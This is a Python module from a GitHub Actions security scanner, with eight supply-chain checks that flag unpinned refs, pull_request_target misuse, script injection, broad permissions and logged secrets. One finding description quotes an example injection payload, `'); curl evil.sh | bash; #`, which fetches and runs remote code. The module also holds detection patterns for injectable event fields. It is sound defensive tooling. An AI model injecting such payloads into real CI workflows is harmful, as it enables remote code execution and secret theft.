"""Supply-chain advanced checks — TeamPCP-class patterns (GHA-201 to GHA-208)."""

from __future__ import annotations

import re
from collections.abc import Iterable

from gha_audit.findings import Finding, WorkflowDoc, check_meta

CATEGORY = "supply_chain_advanced"

# ── regex helpers ─────────────────────────────────────────────────────────────

SHA_RE = re.compile(r"^[a-f0-9]{40}$")

# Unpinned branches that are the canonical TeamPCP attack vector
BRANCH_REFS = {"main", "master", "develop", "dev", "trunk", "latest", "HEAD"}

# Short major-only tags: v1, v2, v3, v4 (no minor/patch component)
MAJOR_TAG_RE = re.compile(r"^v\d+$")

# Loose semver tag: v1.2 or v1.2.3 (mutable — owner can push a new commit)
LOOSE_TAG_RE = re.compile(r"^v\d+(\.\d+)+$")

# Dangerous github.event interpolation fields for GHA-204
INJECTION_FIELDS = [
    re.compile(r"\$\{\{\s*github\.event\.pull_request\.title\s*\}\}"),
    re.compile(r"\$\{\{\s*github\.event\.pull_request\.body\s*\}\}"),
    re.compile(r"\$\{\{\s*github\.event\.issue\.title\s*\}\}"),
    re.compile(r"\$\{\{\s*github\.event\.issue\.body\s*\}\}"),
    re.compile(r"\$\{\{\s*github\.event\.commits\[.*?\]\.message\s*\}\}"),
    re.compile(r"\$\{\{\s*github\.event\.head_commit\.message\s*\}\}"),
    re.compile(r"\$\{\{\s*github\.event\.commits\s*\}\}"),
]

# GHA-207: secrets echoed to logs
ECHO_SECRET_RE = re.compile(
    r"(?i)\b(echo|printf|cat)\b.*\$\{\{\s*secrets\."
)

# GHA-208: known-retired action@ref pairs
RETIRED_REFS: dict[str, set[str]] = {
    "actions/checkout": {"v1"},
    "actions/setup-node": {"v1"},
    "actions/setup-python": {"v1"},
    "actions/setup-go": {"v1"},
}

# Default owner allowlist for GHA-205
DEFAULT_TRUSTED_OWNERS = {
    "actions",
    "github",
    "docker",
    "step-security",
    "aquasecurity",
    "sigstore",
    "trufflesecurity",
    "anchore",
    "slsa-framework",
}


def _parse_uses(uses: str) -> tuple[str, str, str] | None:
    """Split owner/repo[/path]@ref into (owner, repo, ref). Returns None if not a registry ref."""
    if not isinstance(uses, str) or "@" not in uses:
        return None
    if uses.startswith("./") or uses.startswith("docker://"):
        return None
    repo_full, ref = uses.split("@", 1)
    parts = repo_full.split("/")
    if len(parts) < 2:
        return None
    owner = parts[0]
    repo = parts[1]
    return owner, repo, ref


def _get_triggers(doc: WorkflowDoc) -> list[str]:
    on = doc.on
    if isinstance(on, str):
        return [on]
    if isinstance(on, list):
        return [str(t) for t in on if isinstance(t, str)]
    if isinstance(on, dict):
        return list(on.keys())
    return []


# ── GHA-201 ───────────────────────────────────────────────────────────────────

@check_meta(
    id="GHA-201",
    severity="high",
    title="Action pinned to unpinned branch ref (TeamPCP-class: @main/@master)",
)
def check_unpinned_branch_ref(doc: WorkflowDoc) -> Iterable[Finding]:
    """GHA-021 covers third-party branch refs; GHA-201 extends to ALL actions
    using branch refs and frames it explicitly as the TeamPCP supply-chain class."""
    for jname, idx, step in doc.iter_steps():
        uses = step.get("uses")
        parsed = _parse_uses(uses) if isinstance(uses, str) else None
        if not parsed:
            continue
        owner, repo, ref = parsed
        if ref not in BRANCH_REFS:
            continue
        step_name = step.get("name") or f"step #{idx + 1}"
        yield Finding(
            id="GHA-201",
            category=CATEGORY,
            severity="high",
            job=jname,
            step=step_name,
            title=f"Action `{owner}/{repo}` pinned to mutable branch `@{ref}` (TeamPCP class)",
            description=(
                f"`uses: {uses}` pins to branch `{ref}`. Every workflow run "
                "resolves to the current HEAD of that branch. An adversary who "
                "compromises or takeovers the upstream repo can push malicious "
                "code and it executes in your next CI run. This is the defining "
                "characteristic of the March 2026 TeamPCP supply-chain attack "
                "class: actions that trusted maintainers had @main or @master "
                "pinned were silently poisoned."
            ),
            remediation=(
                f"Pin to a full 40-character commit SHA: "
                f"`{owner}/{repo}@<sha>  # {ref}`. "
                "Use Dependabot (ecosystem: github-actions) to auto-bump."
            ),
            fix_yaml_snippet=f"      - uses: {owner}/{repo}@<40-char-sha>  # was: {ref}",
            references=["TeamPCP-2026", "GHA-Action-Pinning"],
        )


# ── GHA-202 ───────────────────────────────────────────────────────────────────

@check_meta(
    id="GHA-202",
    severity="high",
    title="Action pinned to mutable tag — SHA pin recommended",
)
def check_mutable_tag_pin(doc: WorkflowDoc) -> Iterable[Finding]:
    """Flags @vN and @vN.N.N tags. Distinct from GHA-020/021: targets the specific
    major/loose-semver patterns and makes the SHA-pin suggestion actionable."""
    for jname, idx, step in doc.iter_steps():
        uses = step.get("uses")
        parsed = _parse_uses(uses) if isinstance(uses, str) else None
        if not parsed:
            continue
        owner, repo, ref = parsed
        if SHA_RE.match(ref):
            continue  # already SHA-pinned
        if ref in BRANCH_REFS:
            continue  # covered by GHA-201
        if not (MAJOR_TAG_RE.match(ref) or LOOSE_TAG_RE.match(ref)):
            continue
        step_name = step.get("name") or f"step #{idx + 1}"
        yield Finding(
            id="GHA-202",
            category=CATEGORY,
            severity="high",
            job=jname,
            step=step_name,
            title=f"Action `{owner}/{repo}@{ref}` uses mutable tag — convert to SHA",
            description=(
                f"`uses: {uses}` uses tag `{ref}`. Tags are mutable references: "
                "the repository owner (or an attacker who has compromised the owner "
                "account) can force-push the tag to a different commit. Your workflow "
                "will silently pick up the new, potentially malicious, code."
            ),
            remediation=(
                f"Convert to a SHA pin: `{owner}/{repo}@<sha>  # {ref}`. "
                "Run `git ls-remote https://github.com/{owner}/{repo} refs/tags/{ref}` "
                "to get the current commit SHA."
            ),
            fix_yaml_snippet=f"      - uses: {owner}/{repo}@<sha>  # {ref}",
            references=["TeamPCP-2026", "GHA-Action-Pinning"],
        )


# ── GHA-203 ───────────────────────────────────────────────────────────────────

@check_meta(
    id="GHA-203",
    severity="critical",
    title="`pull_request_target` + checkout of PR head SHA/ref (codecov/tj-actions exploitation path)",
)
def check_prt_head_checkout(doc: WorkflowDoc) -> Iterable[Finding]:
    """More targeted than GHA-013: specifically looks for
    github.event.pull_request.head.sha or head.ref in the checkout ref:,
    which is the exact pattern exploited in the March 2026 TeamPCP incidents."""
    triggers = _get_triggers(doc)
    if "pull_request_target" not in triggers:
        return

    for jname, idx, step in doc.iter_steps():
        uses = step.get("uses") or ""
        if not isinstance(uses, str) or not uses.startswith("actions/checkout"):
            continue
        with_block = step.get("with") or {}
        ref = with_block.get("ref") if isinstance(with_block, dict) else None
        if not isinstance(ref, str):
            continue
        head_patterns = [
            "github.event.pull_request.head.sha",
            "github.event.pull_request.head.ref",
            "github.head_ref",
        ]
        if not any(p in ref for p in head_patterns):
            continue
        step_name = step.get("name") or f"step #{idx + 1}"
        yield Finding(
            id="GHA-203",
            category=CATEGORY,
            severity="critical",
            job=jname,
            step=step_name,
            title=(
                f"CRITICAL: `pull_request_target` + `actions/checkout` with PR head ref "
                f"(job '{jname}') — arbitrary fork code runs with base-repo secrets"
            ),
            description=(
                "`pull_request_target` grants the workflow access to base-repo secrets "
                f"and a write-capable GITHUB_TOKEN. Job '{jname}' then checks out "
                f"the PR head (`{ref}`), meaning untrusted fork code runs with "
                "full base-repo privileges. This is the exact technique used in the "
                "codecov incident (2021), tj-actions (2024), and TeamPCP (2026): "
                "a malicious PR triggers `pull_request_target`, checks out the fork "
                "head, and exfiltrates all secrets."
            ),
            remediation=(
                "Remove the `ref: ${{ github.event.pull_request.head.* }}` argument "
                "from `actions/checkout`. If you genuinely need to test PR code, use "
                "`pull_request` (which has no secrets access) or a manual "
                "`workflow_dispatch` gated by reviewer approval."
            ),
            fix_yaml_snippet=(
                "      # REMOVE the `with: ref:` argument entirely:\n"
                "      - uses: actions/checkout@<sha>  # checks out BASE, not fork head"
            ),
            references=["TeamPCP-2026", "Codecov-2021", "tj-actions-2024", "GHA-pull_request_target-Risk"],
        )


# ── GHA-204 ───────────────────────────────────────────────────────────────────

@check_meta(
    id="GHA-204",
    severity="high",
    title="Script injection via `github.event.*` user-controlled field in `run:`",
)
def check_event_injection_run(doc: WorkflowDoc) -> Iterable[Finding]:
    """Detects user-controllable github.event fields interpolated directly into
    run: blocks. GHA-032 and GHA-204 can fire on the same step — intentional,
    as they represent different detection categories. GHA-204 adds commit-message
    injection fields (TeamPCP vector)."""
    for jname, idx, step in doc.iter_steps():
        run = step.get("run")
        if not isinstance(run, str):
            continue
        for pattern in INJECTION_FIELDS:
            m = pattern.search(run)
            if m:
                matched_token = m.group(0)
                step_name = step.get("name") or f"step #{idx + 1}"
                yield Finding(
                    id="GHA-204",
                    category=CATEGORY,
                    severity="high",
                    job=jname,
                    step=step_name,
                    title=f"Script injection: `{matched_token}` interpolated into `run:` (TeamPCP class)",
                    description=(
                        f"Job '{jname}', step '{step_name}': `{matched_token}` is "
                        "user-controllable (any contributor can set a PR title, commit "
                        "message, or issue title). Interpolating it directly into a "
                        "`run:` script lets an attacker execute arbitrary shell commands "
                        "via a crafted value like `'); curl evil.sh | bash; #`. "
                        "Commit-message injection (`head_commit.message`, "
                        "`commits[*].message`) was a key vector in the March 2026 "
                        "TeamPCP campaign."
                    ),
                    remediation=(
                        "Pass the value through `env:` — environment variable "
                        "expansion in bash does NOT interpret shell metacharacters."
                    ),
                    fix_yaml_snippet=(
                        "      env:\n"
                        f"        SAFE_VALUE: {matched_token}\n"
                        "      run: |\n"
                        "        echo \"$SAFE_VALUE\"  # no injection possible"
                    ),
                    references=["TeamPCP-2026", "GHA-Script-Injection"],
                )
                break  # one finding per step


# ── GHA-205 ───────────────────────────────────────────────────────────────────

@check_meta(
    id="GHA-205",
    severity="medium",
    title="Action from non-allowlisted owner (untrusted 3rd-party)",
)
def check_untrusted_owner(doc: WorkflowDoc, trusted_owners: set[str] | None = None) -> Iterable[Finding]:
    """Flags any action whose owner is not in the trusted-owners allowlist.
    Default allowlist: actions, github, docker, step-security, aquasecurity.
    Configurable via trusted_owners parameter."""
    owners = trusted_owners if trusted_owners is not None else DEFAULT_TRUSTED_OWNERS
    for jname, idx, step in doc.iter_steps():
        uses = step.get("uses")
        parsed = _parse_uses(uses) if isinstance(uses, str) else None
        if not parsed:
            continue
        owner, repo, ref = parsed
        if owner.lower() in {o.lower() for o in owners}:
            continue
        step_name = step.get("name") or f"step #{idx + 1}"
        yield Finding(
            id="GHA-205",
            category=CATEGORY,
            severity="medium",
            job=jname,
            step=step_name,
            title=f"Action `{owner}/{repo}` is from non-allowlisted owner `{owner}`",
            description=(
                f"`uses: {uses}` references an action from `{owner}`, which is not "
                "in the trusted-owner allowlist. Third-party actions have full access "
                "to the runner environment, secrets passed via `env:`, and the "
                "GITHUB_TOKEN. Actions from lesser-known owners carry higher "
                "supply-chain risk — account takeover or repo compromise can deliver "
                "malicious code to every consuming workflow."
            ),
            remediation=(
                f"Review `{owner}/{repo}` carefully before use. Prefer well-maintained "
                "alternatives from `actions/*`, `step-security/*`, or `docker/*`. "
                "At minimum, SHA-pin any 3rd-party action you decide to keep."
            ),
            references=["TeamPCP-2026", "GHA-Third-Party-Actions"],
        )


# ── GHA-206 ───────────────────────────────────────────────────────────────────

@check_meta(
    id="GHA-206",
    severity="high",
    title="Top-level `permissions: write-all` or `contents: write` without per-job scoping",
)
def check_top_level_write_permissions(doc: WorkflowDoc) -> Iterable[Finding]:
    """Distinct from GHA-010: targets top-level broad grant with no per-job
    override — the pattern where devs set write perms once and forget it."""
    perms = doc.workflow_permissions
    if perms is None:
        return  # GHA-011 handles missing perms

    is_broad_write = False
    if perms == "write-all":
        is_broad_write = True
    elif isinstance(perms, dict):
        contents_val = perms.get("contents", "")
        if contents_val == "write":
            is_broad_write = True
        if perms and all(v == "write" for v in perms.values()):
            is_broad_write = True

    if not is_broad_write:
        return

    # Fine if every job individually scopes its own permissions
    all_jobs_scoped = doc.jobs and all(
        job.get("permissions") is not None for job in doc.jobs.values()
    )
    if all_jobs_scoped:
        return

    yield Finding(
        id="GHA-206",
        category=CATEGORY,
        severity="high",
        title="Broad write permissions at workflow level without per-job scoping",
        description=(
            f"The workflow grants `permissions: {perms!r}` at the top level and "
            "not every job overrides this with a narrower scope. Every job "
            "receives write GITHUB_TOKEN capabilities. A compromised step in "
            "any job gets broad repo write access (push, release, packages, etc.)."
        ),
        remediation=(
            "Set `permissions: read-all` at the workflow level, then grant only "
            "the write scopes each individual job needs."
        ),
        fix_yaml_snippet=(
            "# workflow level:\n"
            "permissions: read-all\n"
            "# per-job:\n"
            "    permissions:\n"
            "      contents: write"
        ),
        references=["TeamPCP-2026", "GHA-Permissions-Docs"],
    )


# ── GHA-207 ───────────────────────────────────────────────────────────────────

@check_meta(
    id="GHA-207",
    severity="medium",
    title="Secret logged via `echo` / `cat` in `run:` block",
)
def check_secret_echo_log(doc: WorkflowDoc) -> Iterable[Finding]:
    """Distinct from GHA-002: specifically targets echo/printf/cat with
    secrets.* that directly log the secret value to stdout."""
    for jname, idx, step in doc.iter_steps():
        run = step.get("run")
        if not isinstance(run, str):
            continue
        if not ECHO_SECRET_RE.search(run):
            continue
        step_name = step.get("name") or f"step #{idx + 1}"
        yield Finding(
            id="GHA-207",
            category=CATEGORY,
            severity="medium",
            job=jname,
            step=step_name,
            title=f"Secret logged via echo/printf/cat in job '{jname}', step '{step_name}'",
            description=(
                "The `run:` block uses `echo`, `printf`, or `cat` with a "
                "`${{ secrets.* }}` expression. GitHub masks the literal value in "
                "logs, but the mask is bypassable (e.g. split across multiple "
                "echo calls, base64 encoded). Any log artifact or third-party log "
                "shipping will expose the raw value."
            ),
            remediation=(
                "Never pass secrets directly to echo/printf/cat. Pass via `env:` "
                "and reference as `$ENV_VAR` in the script."
            ),
            fix_yaml_snippet=(
                "      env:\n"
                "        MY_SECRET: ${{ secrets.MY_SECRET }}\n"
                "      run: |\n"
                "        # use $MY_SECRET instead of ${{ secrets.MY_SECRET }}"
            ),
            references=["GHA-Security-Hardening", "GHA-Secret-Masking"],
        )


# ── GHA-208 ───────────────────────────────────────────────────────────────────

@check_meta(
    id="GHA-208",
    severity="low",
    title="Action uses a known-retired tag",
)
def check_retired_tag(doc: WorkflowDoc) -> Iterable[Finding]:
    """Flags action refs that are on the known-retired list. Retired versions
    may contain unfixed CVEs, removed APIs, or deprecated runner toolchains."""
    for jname, idx, step in doc.iter_steps():
        uses = step.get("uses")
        parsed = _parse_uses(uses) if isinstance(uses, str) else None
        if not parsed:
            continue
        owner, repo, ref = parsed
        action_key = f"{owner}/{repo}"
        retired_set = RETIRED_REFS.get(action_key)
        if not retired_set:
            continue
        if ref not in retired_set:
            continue
        step_name = step.get("name") or f"step #{idx + 1}"
        yield Finding(
            id="GHA-208",
            category=CATEGORY,
            severity="low",
            job=jname,
            step=step_name,
            title=f"Retired action ref: `{action_key}@{ref}`",
            description=(
                f"`uses: {uses}` references a known-retired tag `{ref}` of "
                f"`{action_key}`. Retired tags may point to versions with "
                "known security issues, removed APIs, or end-of-life Node.js "
                "runtimes. GitHub may also remove retired versions from the "
                "marketplace, causing hard failures."
            ),
            remediation=(
                f"Upgrade to the latest stable release of `{action_key}` "
                "and SHA-pin it."
            ),
            fix_yaml_snippet=f"      - uses: {action_key}@<latest-sha>  # was: {ref}",
            references=["GHA-Action-Pinning", "GHA-Retired-Actions"],
        )


CHECKS = [
    check_unpinned_branch_ref,
    check_mutable_tag_pin,
    check_prt_head_checkout,
    check_event_injection_run,
    check_untrusted_owner,
    check_top_level_write_permissions,
    check_secret_echo_log,
    check_retired_tag,
]
